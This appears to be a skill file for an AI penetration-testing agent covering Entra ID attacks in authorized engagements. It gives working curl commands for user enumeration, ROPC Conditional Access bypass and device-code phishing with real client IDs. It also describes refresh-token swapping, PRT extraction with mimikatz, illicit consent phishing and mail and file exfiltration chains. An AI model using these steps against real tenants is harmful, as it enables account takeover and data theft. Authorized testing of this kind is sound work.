---
name: entra-attack
description: >
  Entra ID (Azure AD) IDENTITY-layer attack methodology for authorized
  engagements: unauthenticated tenant/user enumeration, Conditional Access
  bypass (legacy auth / ROPC / device & platform gaps), token and Primary
  Refresh Token (PRT) abuse, FOCI refresh-token swapping, device-code
  phishing, and illicit OAuth consent grants. Keywords: Entra ID, Azure AD,
  conditional access, CA bypass, ROPC, PRT, device code phishing, FOCI,
  illicit consent, GetCredentialType, getuserrealm, TokenTactics, roadtx,
  AADInternals. Do NOT use for Azure subscription RBAC / management-plane /
  IMDS / Key Vault (see azure-attack) or on-prem AD (see active-directory);
  this skill is the cloud identity tier only.
metadata:
  type: platform
  phase: hunting
  tools: [AADInternals, roadtx, TokenTactics, o365spray, MFASweep, GraphRunner, az-cli]
depends_on: [osint, email-harvesting, cloud-recon]
feeds_into: [chain-analysis, chain-ssrf-to-cloud, report-writing]
chains_with: [azure-attack, okta-attack, oauth, 2fa-bypass, credential-testing]
---

## Signals
- Login redirect to `login.microsoftonline.com` / `login.live.com` / `sts.<domain>` (federated).
- MX/autodiscover points to `*.mail.protection.outlook.com`; SPF includes `include:spf.protection.outlook.com` — strong M365/Entra tenant signal.
- `*.sharepoint.com`, `*.onmicrosoft.com`, Teams/OneDrive presence for `@target.com` users.
- OSINT / email harvest yields a valid-format username to seed enumeration.

## Prerequisites
- Written authorization naming the tenant (domain and/or tenant GUID) and permitting identity-layer testing. User enumeration and spraying against Entra are stateful and monitored (Identity Protection, Smart Lockout) — human-gated per project CLAUDE.md.
- Unauthenticated enumeration needs only a domain.
- Token/PRT paths need either a foothold on an Entra-joined host (PRT) or a phished/consented token.
- Keep this strictly in the **identity** lane: once you hold a token, management-plane/RBAC escalation belongs to `azure-attack`.

## Methodology

### 1. Tenant realm + managed/federated determination (unauthenticated)
```bash
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"
# NameSpaceType: Managed (cloud creds) vs Federated (on-prem ADFS/other IdP -> AuthURL)
curl -s "https://login.microsoftonline.com/target.com/.well-known/openid-configuration" | jq '.token_endpoint, .issuer'
# Tenant GUID is in the issuer. AADInternals equivalent:
#   Invoke-AADIntReconAsOutsider -DomainName target.com
```

### 2. User existence enumeration (quiet oracle)
```bash
# GetCredentialType returns IfExistsResult: 0 = exists, 1 = not found (behavior varies by tenant).
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" \
  -d '{"Username":"user@target.com"}' | jq '.IfExistsResult, .ThrottleStatus'
# o365spray --enum / AADInternals Invoke-AADIntUserEnumerationAsOutsider for lists.
# Validate the oracle against a known-good + known-bad control pair before trusting it.
```

### 3. Measure Smart Lockout BEFORE spraying
```bash
# Entra Smart Lockout is per-identity and tracks familiar vs unfamiliar locations.
# Burn one authorized throwaway identity to learn the threshold/window; stay under it.
# Spraying is a HUMAN GATE — Identity Protection flags it as a risky sign-in.
```

### 4. Legacy-auth / ROPC Conditional Access bypass
```bash
# ROPC (grant_type=password) against a first-party app often bypasses CA policies that
# only target interactive/browser auth or specific client apps. If it returns tokens,
# CA did not cover this path — that is the demonstrable finding.
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d 'grant_type=password&client_id=1b730954-1685-4b74-9bfd-da08cb7f52b4' \
  --data-urlencode 'username=user@target.com' \
  --data-urlencode 'password=Target@2026' \
  --data-urlencode 'scope=https://graph.microsoft.com/.default offline_access'
# MFASweep: map which M365 endpoints/client combos skip MFA for a given credential.
```

### 5. Device-code phishing (token acquisition without password)
```bash
# Request a device code for a first-party public client (e.g. Azure CLI / Microsoft Office),
# deliver the user_code+verification_uri to the target (social-engineering, HUMAN GATE),
# then poll for tokens once they approve. TokenTactics: Get-AzureToken -Client ...
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/devicecode" \
  -d 'client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default offline_access'
# Poll token endpoint with grant_type=urn:ietf:params:oauth:grant-type:device_code
```

### 6. FOCI refresh-token swapping (post token)
```bash
# Family-of-Client-IDs: a refresh token issued to one FOCI app redeems for ANOTHER FOCI app's
# access token. Pivot a narrow token (e.g. Azure CLI) into Teams/Graph/SharePoint scopes.
# roadtx: roadtx refreshtokento -c <other_foci_client> -r <refresh_token> -s <scope>
# This is a demonstrated capability expansion — record the before/after audience (aud) claims.
```

### 7. PRT extraction (Entra-joined foothold only)
```bash
# On an Entra-joined/hybrid host with a foothold, the Primary Refresh Token enables SSO to any
# Entra app. Extraction is a stateful, high-impact action on the target host — HUMAN GATE.
# ROADtoken / mimikatz dpapi; then roadtx to redeem the PRT cookie (x-ms-RefreshTokenCredential).
```

### 8. Illicit OAuth consent grant
```bash
# Register a multi-tenant app requesting high-value delegated scopes (Mail.Read, Files.Read.All,
# offline_access). Phish a user/admin to consent; on approval you get a refresh token for their data.
# Demonstrated only when consent is actually granted and a token used — the consent URL alone is a lure.
# GraphRunner: Invoke-InjectOAuthApp / enumerate existing over-permissioned consents too.
```

## Payloads & Detection Patterns
- **First-party client IDs worth knowing:** Azure CLI `04b07795-8ddb-461a-bbee-02f9e1bf7b46`, Azure PowerShell `1950a258-227b-4e31-a9cf-717495945fc2`, Microsoft Office `d3590ed6-52b3-4102-aeff-aad2292ab01c`. These are public and FOCI-eligible; use them to probe which client the CA policy forgot.
- **CA-gap matrix:** vary {client_id, resource/scope, device platform (user-agent), auth protocol (interactive vs ROPC vs device-code)} and record which combination yields a token without MFA. The matrix cell that succeeds *is* the finding.
- **Existing illicit grants:** enumerate current OAuth app consents (GraphRunner `Get-AzureADApps` / Graph `/oauth2PermissionGrants`) — a pre-existing over-scoped third-party app is a finding without you adding one.

## Bypass Techniques
- **Protocol downgrade:** CA policies scoped to "browser"/"modern auth" clients may leave ROPC and legacy endpoints (`/oauth2/token` v1) open. Demonstrate token issuance to prove the gap.
- **Device-platform / location gaps:** a policy requiring compliant devices only on specific platforms, or trusting named IP ranges, can be sidestepped by presenting an uncovered platform or sourcing from a trusted range. Show the successful sign-in, not the policy text.
- **FOCI audience pivot:** when a token's scope is too narrow for the target action, swap it for a sibling FOCI app's audience rather than re-authenticating.
- **Federated (ADFS) path:** if realm is Federated, the password check happens at on-prem ADFS — golden-SAML / ADFS token-signing abuse belongs to `active-directory`; note the pivot.

## Chain Anchors
- Device-code / consent token → Graph data exfil (mail, files) → `data-exfiltration-test`.
- Entra token with eligible roles → **Azure management plane / RBAC privesc** (`azure-attack`) — hand off at the token boundary.
- PRT → tenant-wide SSO → SharePoint on-prem via hybrid (`sharepoint-onprem`), or back to on-prem AD (`active-directory`).
- Okta-federated-to-Entra tenant → cross-IdP pivot (`okta-attack`).

## Tooling
`AADInternals`, `roadtx` (ROADtools), `TokenTactics`, `o365spray`, `MFASweep`, `GraphRunner`, `az-cli`. Prefer `roadtx`/`AADInternals` for token mechanics; keep spraying on rate-limited custom tooling with Smart-Lockout awareness.

## Validation Gate
- A CA bypass is **Demonstrated** only when you hold an actually-issued access token (capture `aud`, `scp`/`roles`, `appid`) obtained through the uncovered path — a theory about policy coverage is **Unproven**.
- User-enumeration oracles require a same-run control pair (known-good vs known-bad) with the `IfExistsResult`/timing differential recorded; otherwise **Inferred**.
- Device-code and consent findings need the token actually redeemed and a benign scoped action performed (e.g. `GET /me`), not just the lure delivered.
- FOCI/PRT findings must show the resulting token used against the target resource; audience strings alone are **Inferred**.

## Gotchas
- **Stay out of the azure-attack lane.** Holding an Entra token is the identity win; enumerating RBAC role assignments, IMDS, Key Vault and management-plane privesc is `azure-attack`. Report the identity finding and hand off the token rather than double-covering.
- `GetCredentialType` `IfExistsResult` semantics are **tenant-dependent** and Microsoft has changed them; some tenants always return 0 (anti-enumeration). Always calibrate against a control pair before reporting an oracle.
- Smart Lockout and Identity Protection make spraying risky and visible — unfamiliar-location sign-ins raise risk and can trigger MFA/block even with a correct password. A `AADSTS50126` (bad password) vs `AADSTS50076` (MFA required) differential still proves the password.
- ROPC fails for any federated user and for users with MFA enforced via CA on that app — a failure is not proof MFA is everywhere; try the full CA-gap matrix.
- Device-code phishing and consent grants are **user-targeting social actions**: explicit per-target human-gate sign-off is required, and the "victim" in an engagement must be an authorized test identity unless the scope says otherwise.
- First-party client IDs and FOCI membership change over time; re-verify a client is still FOCI-eligible before relying on a refresh-token swap.
